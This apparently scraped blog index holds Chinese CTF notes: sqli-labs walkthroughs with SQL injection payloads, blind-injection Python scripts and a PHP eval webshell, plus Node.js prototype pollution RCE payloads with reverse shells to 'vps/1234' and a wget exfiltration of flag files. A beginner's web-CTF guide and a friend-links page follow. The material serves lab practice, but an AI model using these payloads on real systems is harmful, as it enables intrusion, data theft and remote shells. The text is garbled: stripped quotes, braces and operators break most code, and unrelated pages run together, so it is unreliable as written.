唯一注意点就是查询时要用-1 因为我们要得到union后的结果 level-2数字型注入 后面过程和level-1一样 -1 union select 1,2,group_concat(username,id,password) from users--+ level-3输入1’ 回显中有个) 说明sql语句里有() 考虑加入) 与前面的( 构成闭合 1’ ) –+构造闭合成功 后面与level-1 level-2 一样 -1) union select 1,2,group_concat(username,id,password) from users--+ level-4双引号和括号构造闭合 -1) union select 1,2,group_concat(username,id,password) from users--+ level-51’ –+ 没有回显 采用报错注入 1 and updatexml(1,concat(0x7e,database()),1) --+ #爆出数据库 1 and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=security),1,32)),1)--+ 1 and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=security and table_name=users),1,32)),1) --+ 1 and updatexml(1,concat(0x7e,substr((select group_concat(username,id,password) from users),1,30)),1) --+#这里回显的并非全部内容 1 and updatexml(1,concat(0x7e,(select username from users limit ,1)),1) --+1 and updatexml(1,concat(0x7e,(select username from users limit 1,1)),1) --+#用limit一个一个看字段内容 报错注入原理MySQL提供了一个 updatexml() 函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。所以我们可以利用第二个参数来得到我们想要的敏感数据。 updatexml()函数updatexml(xml_doument,XPath_string,new_value)第一个参数：XML的内容第二个参数：是需要update的位置XPATH路径第三个参数：是更新后的内容所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH 长度限制updatexml() 函数的报错内容长度不能超过32个字符，解决方式有两种： 1.limit 分页 ?id=-1 and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,1)),3) --+ 2.substr()截取字符 ?id=-1 and updatexml(1,concat(0x7e,substr((select group_concat(user)from mysql.user), 1 , 31)),3) --+ 意思为从第一个字符开始截取31个字符 level-6和level-5类似 不过是”闭合 1 and updatexml(1,concat(0x7e,substr((select group_concat(username,id,password) from users),1,30)),1) --+ level-7考点：sql写入文件写入条件：权限为root、知道网站的物理路径、secure_file_priv空 secure_file_priv的值为null ，表示限制mysqld不允许导入|导出secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制 注意点：要知道web路径 EX: D:\\phpstudy_pro\\WWW\\a.txt #文件路径不能使用反斜线\\，要使用斜线 文件内容可以是一句话木马等 读文件：load_file 读取文件内容 load_file(‘varwwwhtmlflag.php’) root权限在已知绝对路径的情况下 写文件用法：into outfile(可以写入多行，按格式输出) into dumpfile(写入单行没有输出格式) 1)) union select 1,?php @eval($_POST[attack]);?,3 into outfile D:\\\\phpstudy_pro\\\\WWW\\\\aaa.php --+ 查看目录存在aaa.php或者菜刀能连上就成功 level_8布尔盲注：写脚本！ import requestsurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-8/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 mid = (low + high) // 2 while low high: payload = 1 and ascii(substr((select database()),%d,1)) %d-- % (i,mid) #--后面要加空格哦 params = id: payload r = requests.get(url, params=params) if You are in........... in r.text: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 32: break name = name + chr(mid) print(name)get_database(url)payload2:1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)) %d-- payload3:1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),%d,1)) %d-- payload4:1 and ascii(substr((select group_concat(username,id,password) from users),%d,1)) %d-- ////import requestsimport timeurl= database =#payload1 = ?stunum=1^(ascii(substr((select(database())),,1)))^1#payload2 = ?stunum=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=ctf)),,1)))^1#payload3 =?stunum=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=flag)),,1)))^1#payload4 = ?stunum=1^(ascii(substr((select(group_concat(value))from(ctf.flag)),,1)))^1for i in range(1,10000): low = 32 high = 128 mid =(low + high) // 2 while(low high): # payload = payload1.format(i,mid) #查库名 # payload = payload2.format(i,mid) #查表名 # payload = payload3.format(i,mid) #查列名 #payload = payload4.format(i,mid) new_url = url + payload r = requests.get(new_url) time.sleep(0.1) print(new_url) if Hi admin, your score is: 100 in r.text: low = mid + 1 else: high = mid mid = (low + high) //2 if (mid == 32 or mid == 132): break database +=chr(mid) print(database)print(database) import requests#调用请求模块import time#调用时间模块import re#调用规则表达式模块url=http://9819e874-b0cf-49cd-91b3-4aa443e1b27a.node5.buuoj.cn:81/#题目链接flag = #创建一个变量用来存放flag值for i in range(1,50): #for循环遍历，i表示flag值大致长度是50以内 max = 127 #赋值127 min = 0 #赋值0 for c in range(0,127): #for循环遍历 s = (int)((max+min)/2) #首先将 max 和 min 相加，然后除以 2，最后将结果强制转换为整数类型。 payload = 1^(ascii(substr((select(flag)from(flag)),+str(i)+,1))+str(s)+) #^异或运算符，相同为假，不相同为真，1^payload，若为payload结果为假，则返回0，1^0=1，将得到查询id=1时的结果，回显Hello, glzjin wants a girlfriend。 #从flag数据表中选择一个名为flag的字段，然后取这个字段的字符串（从位置 +str(i)+ 开始，长度为 1（每次只返回一个）） #将这个字符串转换为 ASCII 码，然后判断这个 ASCII 码是否大于一个名为 s 的变量。 r = requests.post(url,data = id:payload) #requests模块的运用，将payload赋值给题目中这个名为id的参数 time.sleep(0.005) #每循环一次休眠0.005秒 if Hello in str(r.content): #如果Hello这个字符串在生成的结果中，那么就继续向下进行 max=s #将s的值赋值给max else: #反之 min=s #将s的值赋值给min if((max-min)=1): #如果max-min的值 flag+=chr(max) #将max的ASCII值转化为字符串 print(flag) #输出flag break #跳出循环 level_9时间盲注：写脚本！ 1’ and if(length(database())1,sleep(5),1)–+ #可以查看闭合是不是正确的 闭合正确网页就会睡5秒 IF语法语法：IF(condition, value_if_true, value_if_false)condition是一个条件表达式，如果条件成立，则返回value_if_true，否则返回value_if_false。 import requestsimport timeurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-9/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 mid = (low + high) // 2 while low high: payload = 1 and if(ascii(substr(database(), %d, 1)) %d, sleep(1), 0)-- % (i, mid) params = id: payload start_time = time.time() r = requests.get(url, params=params) end_time = time.time() if end_time - start_time = 1: low = mid + 1 else: high = mid mid = (low + high) // 2 if mid == 32: break name = name + chr(mid) print(name)get_database(url) payload2:1 and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()), %d, 1)) %d, sleep(0.5), 0)-- payload3:1 and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()), %d, 1)) %d, sleep(0.5), 0)-- payload4:1 and if(ascii(substr((select group_concat(username,id,password) from users), %d, 1)) %d, sleep(0.5), 0)-- level_101’ and if(length(database())1,sleep(5),1)–+ #没睡 1” and if(length(database())1,sleep(5),1)–+ #延迟了 说明闭合方式是” 然后盲注 方式和level_9一样 level_11‘闭合 level_12闭合方式”) 1”) union select 1,database()# 类似 正常联合注入 level_13闭合方式’) 然后只会回显成功登录 尝试下报错注入 成功了 就报错注入正常做 level_14“闭合 报错注入正常注入 level_15import requestsimport timeurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-15/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 while low high: mid = (low + high) // 2 payload = admin and if(ascii(substr(database(), %d, 1)) %d, sleep(0.5), 0)# % (i, mid) params = uname: payload, passwd: admin, submit: Submit start_time = time.time() r = requests.post(url, data=params) end_time = time.time() if end_time - start_time = 0.5: low = mid + 1 else: high = mid if low == 32: break name += chr(low) print(name)get_database(url) 然后正常盲注 level_16import requestsimport timeurl = http://127.0.0.1/sqli-labs-master/sqli-labs-master/Less-16/def get_database(url): name = for i in range(1, 100): low = 32 high = 128 while low high: mid = (low + high) // 2 payload = admin\\) and if(ascii(substr(database(), %d, 1)) %d, sleep(0.5), 0)# % (i, mid) params = uname: payload, passwd: admin, submit: Submit start_time = time.time() r = requests.post(url, data=params) end_time = time.time() if end_time - start_time = 0.5: low = mid + 1 else: high = mid if low == 32: break name += chr(low) print(name)get_database(url) 以此类推 level_17报错注入or盲注 不多写 报错注入类型补充extractvalue报错注入extractvalue(XML_document,XPath_string) 只有两个参数 1 and extractvalue(1,concat(0x7e,database()))#1 and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))#以此类推 floor报错注入1 and (select 1 from (select count(*),concat(0x7e,(database()),0x7e,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+ 1 and (select 1 from (select count(*),concat(0x23,(select column_name from information_schema.columns where table_schema=security and table_name=emails limit 0,1),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+ levle_18user_agent注入 报错注入 level_19referer注入 报错注入 level_20cookie注入 报错注入 和前文差不多 level_21cookie注入 不过写入的payload需要base64编码 level_22cookie注入 不过闭合方式从’ - “ 仍然要编码 level_23考点：过滤# –+ 可以考虑用一个表达式构造闭合 -1 union select 1,database(),3 and 1 = 1-1 union select 1,database(),3 or 1 = 1#第一个和sql语句的第一个构成闭合 payload尾的1和sql语句的构成闭合 使1=1成立 完美的不用注释符号就构造了闭合最后语句：-1 union select 1,(select group_concat(username,id,password) from users),3 and 1 = 1 其实也可以把表达式替换为’ -1 union select 1,database(),3 level_24考点：二次注入 二次注入的原理：在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。 在将数据存入到了数据库中之后，开发者就认为数据是可信的。在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据，没有进行进一步的检验和处理，这样就会造成SQL的二次注入。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在拼凑的过程中，就形成了二次注入。 过程:先构造恶意语句 然后存入数据库 然后第二次构造语句 过程首先注册admin’#帐号 123456 然后修改admin’#的密码 但是实际上修改的是admin的密码 #原语句UPDATE users SET PASSWORD=$pass where username=$username and password=$curr_pass #插入 payload 后的语句UPDATE users SET PASSWORD=$pass where username=admin# and password=$curr_pass#此时 admin 后的语句被注释 #真正的生效的语句UPDATE users SET PASSWORD=$pass where username=admin#从而达到了修改用户 admin 密码的目的 level_25将or和and替换为空 oorr aandnd 然后正常注入 level_26过滤了空格 注释符 or and * 和\\ 空格用()代替 注释符通过表达式或符号构造闭合 or和and可以双写绕过 还可以使用|| 1||(updatexml(1,concat(0x7e,(select(database()))),1))||1=11||(updataxml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=security))))||1=11||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=security))),1))||1=11||(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=security))),1))||1=11||(updatexml(1,concat(1,(select(group_concat(passwoorrd,username))from(users))),1))||1=1 level_27过滤了select SELECT Select union UNION Union * # – + 空格可以用%09和%0a替代 select用sElect 1and%09updatexml(1,concat(1,(sElect%09database())),1)%0aand1=1 level_28* – + 空格 过滤union select 这个组合 空格用编码 注释用表达式等式 union select组合绕过 uniunion%0Aselecton%0Aselect%0A -1)uniunion%0Aselecton%0Aselect%0A1,2,group_concat(table_name)from%0Ainformation_schema.tables%0Awhere%0Atable_schema=securityand (1 level_29考点;http参数污染来进行注入 tomcat只解析重复参数里面的前者，而Apache只解析重复参数里面的后者，我们可以传入两个id参数，前者合法而后者为我们想注入的内容,我们的后端是apache，那么我们只要将参数放在后面即可。 payload: ?id=1id=-1 union select 1,database(),3 --+?id=1id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+以此类推 level_30闭合方式改为” 其他和29一样 level_31闭合方式为’) 其他和29一样 level_32宽字节注入原理: 一个gbk编码汉字，占用2个字节。 一个utf-8编码的汉字，占用3个字节。 addslashes函数的作用就是让’变成，让引号变得不再是原本的“单引号”，没有了之前的语义，而是变成了一个字符。那么我们现在要做的就是想办法将’前面的\\给它去除掉：既然这函数给’前面加了一个\\那么是不是想办法给\\前面再加一个\\（或单数个即可），然后变成了\\‘，这样\\就又被转义了，这样就成功的逃出了addslashes的限制 ‘前面加%df 然后正常注入 -1%df union select 1,2,database()--+ 知识点空格绕过在docker中，空格可以用转义符%a0代替。 技巧来源题目：[SWPU2019]Web1-CSDN博客 1/**/union/**/select/**/1,database(),group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=web1 这样可以不用information 绕过对or的限制 1/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22 已经知道表名的情况下可以采用无列名爆破法 普通的sq查询select * from users查询表，并把列名替换为1，2，3.4，5，6select 1,2,3,4,5 ,6 union select * from users单独把第四列提出来，(select 1,2,3,4,5,6 union select * from users)a给查询结果命名 select `4` from (select 1,2,3,4,5,6 union select * from users)a;若反引号被过滤，可以这样select b from (select 1,2,3 as b,4,5 union select * from users)a;测试:-- 在已经知道beanbook表，但是不知道其字段名的情况下，爆出该表的字段值-- 爆出第3列的值,把3当作第三列的字段名select `3` from (select 1,2,3,4,5,6 union select * from beanbook) as b-- 爆出第1列的值，把别名a当作第一列的字段名select a from (select 1 as a,2,3,4,5,6 union select * from beanbook) as b 解释来源：[BUUCTF_WEB_[SWPU2019]Web1 题解 - South](","tags":["CTF-wp"]},{"title":"Node.js原型链污染学习","path":"/2025/04/06/原型链污染/","content":"原型链污染学习链接：https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html?page=1 node.jsjs创建对象的形式1.普通创建var name=name:sauy,age:19var person= 2.构造函数方法创建function person() this.name=sauy; this.test=function () return 23333; person.prototype.a=3;web=new person();console.log(web.test());console.log(web.a) 3.通过object创建var a=new object();a.c=3console.log(a,c) prototype和__proto__prototype原型对象 __proto__ 原型链连接点 function Foo() this.bar=1Foo.prototype.show = function show() console.log(this.bar) let foo = new foo() foo.show() 1.用法（有点绕对象.ptoto构造器(构造函数).prototype 构造器.prototype其实也是一个对象，为构造函数的原型对象，同样有__proto__属性，一直通过原型链__proto__最终可找到null。 我们可以通过Foo.prototype来访问Foo类的原型，但Foo实例化出来的对象，是不能通过prototype访问原型的。这时候，就该__proto__登场了。 一个Foo类实例化出来的foo对象，可以通过foo.__proto__属性来访问Foo类的原型，也就是说： foo.__proto__ == Foo.prototype 理解：每个类对象实例化的时候都会拥有prototype中的属性和方法 一个对象的__proto__的属性，指向这个对象所在类的prototype的属性 var A=function();var a=new A();链子顺序如下图： Ex： function Father() this.first_name = Donald this.last_name = Trump function Son() this.first_name = Melania Son.prototype = new Father() //让son的父类为father 子类主动去选择了父类 let son = new Son()console.log(`Name: $son.first_name $son.last_name`)//最后son继承的father的last_name的属性-输出：Name:Melania Trump 调用son.last_name的时候 实际js内部的操作： son中找不到last_name，就在son.__ptoto__中寻找last_name,这里找到了last_name于是就输出 如果没有找不到，则在son.__proto__.__proto__中继续寻找,以此类推，直到null结束。 上面描述的js的查找机制就称为：prototype继承链 原型链污染1.上述描述实践 // foo是一个简单的JavaScript对象let foo = bar: 1 // foo.bar 此时为1console.log(foo.bar) // 修改foo的原型（即Object）foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1console.log(foo.bar) // 此时再用Object创建一个空的zoo对象let zoo = // 查看zoo.barconsole.log(zoo.bar)最后，虽然zoo是一个空对象，但zoo.bar的结果居然是2： 解释：因为前面我们修改了foo的原型foo.__proto__.bar = 2，而foo是一个Object类的实例，所以实际上是修改了Object这个类，给这个类增加了一个属性bar，值为2。 后来，我们又用Object类创建了一个zoo对象let zoo {}，zoo对象自然也有一个bar属性了 2.切入口 实现原型链污染找到控制数组(对象)的键名的操作就可以： 对象和属性的表达方式很多，如下图： 对象merge(合并) 对象clone(克隆) merge：下述代码展示了merge的具体功能 function merge(target, source) for (let key in source) if (key in source key in target) merge(target[key], source[key]) else target[key] = source[key] 理解: const obj1 = a: 1, b: x: 10 ;const obj2 = b: y: 20 , c: 3 ;merge(obj1, obj2);console.log(obj1);//最后会输出 a: 1,b: x: 10, y: 20 ,c: 3 a和c都只存在各自的类里，b两个类都有，所以合并在一起。 let o1 = let o2 = a:1,__proto__:b:2merge(o1,o2)console.log(o1.a,o1.b)o3 = console.log(o3.b) 上述代码成功合并 3.攻击方式 function Father() this.first_name = Donald this.last_name = Trump function Son() this.first_name = Melania Son.prototype = new Father() let son = new Son()son.__ptoto__[lat_name] = hello;let secondson = new Son();console.log(`son Name:$son.last_name`);console.log(`secondson Name:$secondson.last_name`);-son Name: hello-second Name: hello let foo = bar:1foo.__proto__.bar = require(\\child_process\\).execSync(\\calc\\);let zoo = eval(zoo.bar) hero.name: 锐雯,__proto__.block: type: Text,line:process.mainModule.require(child_process).execSync(wget ip:port/`cat /*f*`)hero.name: 锐雯,__proto__: hero.name: return e = for (var a in ) delete Object.prototype[a]; return global.process.mainModule.constructor._load(child_process).execSync(id) 例题：node.js代码审计 [西湖论剑 2022]Node Magical Loginconst fs = require(fs);const SECRET_COOKIE = process.env.SECRET_COOKIE || this_is_testing_cookieconst flag1 = fs.readFileSync(/flag1)const flag2 = fs.readFileSync(/flag2)function LoginController(req,res) try const username = req.body.username const password = req.body.password if (username !== admin || password !== Math.random().toString()) res.status(401).type(text/html).send(Login Failed) else res.cookie(user,SECRET_COOKIE) res.redirect(/flag1) catch (__) function CheckInternalController(req,res) res.sendFile(check.html,root:static)function CheckController(req,res) let checkcode = req.body.checkcode?req.body.checkcode:1234; console.log(req.body) if(checkcode.length === 16) try checkcode = checkcode.toLowerCase() if(checkcode !== aGr5AtSp55dRacer) res.status(403).json(msg:Invalid Checkcode1: + checkcode) catch (__) res.status(200).type(text/html).json(msg:You Got Another Part Of Flag: + flag2.toString().trim()) else res.status(403).type(text/html).json(msg:Invalid Checkcode2: + checkcode) function Flag1Controller(req,res) try if(req.cookies.user === SECRET_COOKIE) res.setHeader(This_Is_The_Flag1,flag1.toString().trim()) res.setHeader(This_Is_The_Flag2,flag2.toString().trim()) res.status(200).type(text/html).send(Login success. Welcome,admin!) if(req.cookies.user === admin) res.setHeader(This_Is_The_Flag1, flag1.toString().trim()) res.status(200).type(text/html).send(You Got One Part Of Flag! Try To Get Another Part of Flag!) else res.status(401).type(text/html).send(Unauthorized) catch (__) module.exports = LoginController, CheckInternalController, Flag1Controller, CheckController const express = require(express)const fs = require(fs)const cookieParser = require(cookie-parser);const controller = require(./controller)const app = express();const PORT = Number(process.env.PORT) || 80const HOST = 0.0.0.0app.use(express.urlencoded(extended:false))app.use(cookieParser())app.use(express.json())app.use(express.static(static))app.post(/login,(req,res) = controller.LoginController(req,res))app.get(/,(res) = res.sendFile(__dirname,static/index.html))app.get(/flag1,(req,res) = controller.Flag1Controller(req,res))app.get(/flag2,(req,res) = controller.CheckInternalController(req,res))app.post(/getflag2,(req,res)= controller.CheckController(req,res))app.listen(PORT,HOST,() = console.log(`Server is listening on Host $HOST Port $PORT.`)) web335使用js里的eval执行命令 1.require(child_process).execSync(cat f*) ?eval=require(child_process)[exe%2BcSync](ls) 绕过对exec的限制 2.require(child_process).spawnSync(ls,[.]).stdout.toString() require(child_process).spawnSync(cat,[fl001g.txt]).stdout.toString() 3.global.process.mainModule.constructor._load(child_process).execSync(ls,[.]).toString() require 是 Node.js 中用来引入模块的函数，在这里引用了Node.js的child_process模块child_process 模块是 Node.js 标准库中的一个模块，它提供了创建子进程的功能，可以通过它执行系统命令、shell 脚本等。其中包含有spawnSync()方法，spawnSync函数可以用来执行系统命令spawnSync(‘ls’,[‘.’]) 前面代表命令，后面是一个参数，这里的 . 代表着当前目录， … 代表上一级目录 …/… 代表上上级目录这中间用于连接的两个点是用来访问对象属性的stdout’是一个缓冲区，它包含了子进程的标准输出，也就是说输出的内容在这里toString()转换为字符串 web36过滤了load和exec 使用上一次那个命令就好 web337var express = require(express);var router = express.Router();var crypto = require(crypto);function md5(s) return crypto.createHash(md5) .update(s) .digest(hex);/* GET home page. */router.get(/, function(req, res, next) res.type(html); var flag=xxxxxxx; var a = req.query.a; var b = req.query.b; if(a b a.length===b.length a!==b md5(a+flag)===md5(b+flag)) res.end(flag); else res.render(index, msg: tql); );module.exports = router; 1.传入a[]1b[]2 a=x:1b=x:2 web338基础原型链污染 var express = require(express);var router = express.Router();var utils = require(../utils/common); /* GET home page. */router.post(/, require(body-parser).json(),function(req, res, next) res.type(html); var flag=flag_here; var secert = ; var sess = req.session; let user = ; utils.copy(user,req.body); if(secert.ctfshow===36dboy) res.end(flag); else return res.json(ret_code: 2, ret_msg: 登录失败+JSON.stringify(user)); ); module.exports = router; module.exports = copy:copy;function copy(object1, object2) for (let key in object2) if (key in object2 key in object1) copy(object1[key], object2[key]) else object1[key] = object2[key] payload: username:11,password:11,__proto__:ctfshow:36dboy//就是通过这个来改变成员属性 secret的父类都有ctfshow这个对象 于是他也有 web339Ejs原型链污染EJS是一个javascript模板库，用来从json数据中生成HTML字符串 % code %用来执行javascript代码 其实和ssti差不多 不过ssti是\\执行python代码 预期解 变量覆盖在login下post __proto__:query:return global.process.mainModule.constructor._load(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\) 然后再访问api 多尝试几次 监听到然后rce找flag 原理：其实还是就是原型链污染 object可以被子类继承 仿照题目代码的小demo function copy(object1, object2) for (let key in object2) if (key in object2 key in object1) copy(object1[key], object2[key]) else object1[key] = object2[key] user = body = JSON.parse(__proto__:query:return 2233);copy(user, body) query: Function(query)(query)//会输出 query: 2233 /*首先看看 query 值是如何被改变的，其实就是通过 web338 的原型链污染，即 JS 中所有的对象的原型都可以继承到 Object，然后终点是 null 对象*/ 非预期解 ejs模板漏洞__proto__:outputFunctionName:_tmp1;global.process.mainModule.require(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\);var __tmp2 直接在·login目录·传·这个·payload就·ok 监听1234端口就好 web340这个题就是·要进行两次污染关键代码 var express = require(express);var router = express.Router();var utils = require(../utils/common);/* GET home page. */router.post(/, require(body-parser).json(),function(req, res, next) res.type(html); var flag=flag_here; var user = new function() this.userinfo = new function() this.isVIP = false; this.isAdmin = false; this.isAuthor = false; ; utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin) //污染两次·才可以·正确· res.end(flag); else return res.json(ret_code: 2, ret_msg: 登录失败); );module.exports = router; payload:__proto__:__proto__:query:return global.process.mainModule.constructor._load(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\) 也是先在login路由 然后访问api路由 web341__proto__:__proto__:outputFunctionName:_tmp1;global.process.mainModule.require(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\);var __tmp2 __proto__:__proto__:outputFunctionName:_tmp1;global.process.mainModule.require(child_process).exec(bash -c \\bash -i /dev/tcp/vps/1234 01\\);var __tmp2","tags":["CTF学习"]},{"title":"About","path":"/about/index.html","content":"一位正在成长的 web 苦手 Location: Chengdu, Sichuan Study: 本科计算机在读生 Amusement: 动漫 游戏 阅读 猫咪 o(=•ェ•=)m: MzU2MDI1MzU4OQ=="},{"path":"/images/WEB入门文档.html","content":"你好啊想要入门web的小黑客~ 一、Web 是个什么玩意？Web 就是我们在浏览器里看到的网站，是连接整个信息世界的线索网。 从你刷微博、看淘宝、追动漫、点外卖……都在使用 Web 应用。它的背后是由前端（你看得见的部分）+ 后端（你看不见的逻辑处理）构成的庞大系统。 而 CTF 中的 Web 题目，就是围绕这些网站的漏洞展开的夺旗游戏。如果连网站是怎么运行的都不知道，那你怎么知道该往哪儿下刀呢？所以，你可以动手搭建一个你自己的小网站，这是所有 Web 手的必备技能！ 二、学习方法【技能一】：不懂就搜 打开你最喜欢的搜索引擎（推荐：Google、Bing），大胆搜。不管是“如何使用 burp”还是“PHP怎么上传文件”，统统都能搜到。信息检索能力也是一项必备的技能 【技能二】：不懂就问 推荐：先知社区、Freebuf、知乎、CSDN、看雪、大佬个人博客 当然你有任何疑问也可以找吾或者实验室其他web方向的师傅，我们非常乐意回答你的问题，但是提问也需要一定的技巧，吾为你提供一本技巧书，看完你的提问效率将大大提升！ Smart Questions 【技能三】：学会记录笔记 拥有本地笔记是非常必要的，它可以在你遗忘时快速搜到知识点也可以帮你加深对知识点的印象。 本地写笔记的软件非常多，吾用的是Typora！这里你也会学到一点md语法。 三、成长路线入门 Web CTF，你大概会经过以下几个“阶段”，每一关都充满怪物和宝藏： 配置环境（最痛但必要）环境配置之路，可谓无数勇者泪洒的副本…… 用虚拟机（推荐 VMware + kali)，边学 shell 命令边体验黑客范。 浏览器装上插件（hackbar、Proxy SwitchyOmega、Wappalyzer） 本地代码编辑器:visual studio code、pycharm、phpstorm等 常用工具准备好：Burp Suite（抓包神器）PHPStudy（本地跑网站）dirsearch（目录爆破）AntSword 其他推荐：Everything（快速找文件）fofa（信息收集神器）cmd5、站长之家（基础查询工具) Tip：这些工具并不需要你一次下完，都是在你做题过程中逐渐积累的 掌握基础知识HTTP协议：理解请求头、响应体、各种请求方法（GETPOST) 编码与加解密：base64、URL编码、hash 等，搞清楚它们什么时候出现、怎么识别、怎么还原。 身份认证：cookie、session、jwt 前端：html、css、javascript（很重要） 后端:php,python等 新手最常见的就是php，php非常灵活容易被利用 脚本语言:python，web常用的就是爬虫 刷题打比赛刷题平台: NSSCTF(我们团队自主开发的平台)https://www.nssctf.cn/ ctfhub：https://www.ctfhub.com/ bugku：https://ctf.bugku.com/ buuctf：https://buuoj.cn/ (上面的题目较难，适合中期web手练习) 等等 练习建议：打一个题 → 查 WP（writeup） → 学一个漏洞 → 打一类题 → 再看WP 记在笔记中 不要“乱打”，一定要搞懂漏洞原理和利用条件 四、漏洞基础漏洞SQL注入 XSS CSRF SSRF 文件上传 文件包含 PHP 反序列化 远程代码执行(RCE) SSTI XXE 原型链污染 其他进阶Java反序列化、沙箱逃逸……这些初学可以跳过，但早晚要面对的终极BOSS 五、最终建议多看书，多看社区（CTF-Wiki、先知、Freebuf） 多动手，光看是不够的 多加社群，找大佬指点 多总结，记录你练过的题和踩过的坑 心态非常重要，永远不要觉得“太难” 相信当你成功拿到flag的那一刻的感受是无以伦比的！加油小黑客，web的大门已为你敞开，开启你的试练吧！"},{"title":"Friendlinks","path":"/links/index.html","content":"Friendlinks 土豆猫 土豆来了~ Samsara 超强的RE手捏 heyi404 WEB好队友ヽ(✿ﾟ▽ﾟ)ノ Harukaze 一只沉迷gal的Re手 Reisen Re大手!校队好友O(∩_∩)O .friend-links { display: flex; flex-wrap: wrap; gap: 20px; } .friend-link { width: 200px; text-align: center; border: 1px solid #ddd; border-radius: 12px; padding: 15px; background: #fafafa; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.05); transition: transform 0.2s ease, box-shadow 0.2s ease; } .friend-link:hover { transform: translateY(-5px); box-shadow: 0 6px 10px rgba(0, 0, 0, 0.1); } .friend-link a { text-decoration: none; color: #333; } .friend-link a:hover { text-decoration: none; color: #111; } .friend-link img { width: 64px; height: 64px; border-radius: 50%; object-fit: cover; margin-bottom: 10px; } .friend-link p { margin: 5px 0; font-size: 14px; }"}]